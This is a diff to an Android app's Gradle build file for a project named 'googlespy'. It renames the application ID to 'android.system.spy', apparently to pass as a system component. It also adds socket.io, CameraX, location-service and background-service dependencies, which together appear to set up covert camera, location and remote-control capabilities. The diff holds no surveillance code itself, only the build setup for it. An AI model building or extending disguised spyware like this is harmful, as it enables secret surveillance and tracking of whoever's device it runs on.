@@ -3,12 +3,16 @@ plugins {
     alias(libs.plugins.kotlin.compose)
 }
 
+base {
+    archivesName.set("android.system.spy")
+}
+
 android {
     namespace = "com.example.googlespy"
     compileSdk = 34
 
     defaultConfig {
-        applicationId = "com.example.googlespy"
+        applicationId = "android.system.spy"
         minSdk = 28
         targetSdk = 34
         versionCode = 1
@@ -38,12 +42,19 @@ android {
 dependencies {
     implementation(libs.androidx.core.ktx)
     implementation(libs.androidx.lifecycle.runtime.ktx)
+    implementation(libs.androidx.lifecycle.service.ktx)
     implementation(libs.androidx.activity.compose)
     implementation(platform(libs.androidx.compose.bom))
     implementation(libs.androidx.compose.ui)
     implementation(libs.androidx.compose.ui.graphics)
     implementation(libs.androidx.compose.ui.tooling.preview)
     implementation(libs.androidx.compose.material3)
+    implementation(libs.socket.io.client)
+    implementation(libs.camerax.core)
+    implementation(libs.camerax.camera2)
+    implementation(libs.camerax.lifecycle)
+    implementation(libs.play.services.location)
+    implementation(libs.androidx.lifecycle.process)
     testImplementation(libs.junit)
     androidTestImplementation(libs.androidx.junit)
     androidTestImplementation(libs.androidx.espresso.core)
